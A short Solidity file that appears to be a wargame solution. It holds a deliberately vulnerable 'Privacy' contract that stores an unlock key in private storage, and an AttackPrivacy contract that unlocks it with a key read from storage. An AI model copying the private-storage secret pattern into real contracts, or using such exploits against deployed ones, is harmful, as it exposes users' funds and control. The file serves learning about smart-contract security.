// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(now);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) public {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}

contract AttackPrivacy {
    Privacy victim;

    constructor(address _victim) public {
        victim = Privacy(_victim);
    }

    function attack(bytes32 data) public {
        bytes16 key = bytes16(data);
        victim.unlock(key);
    }
}
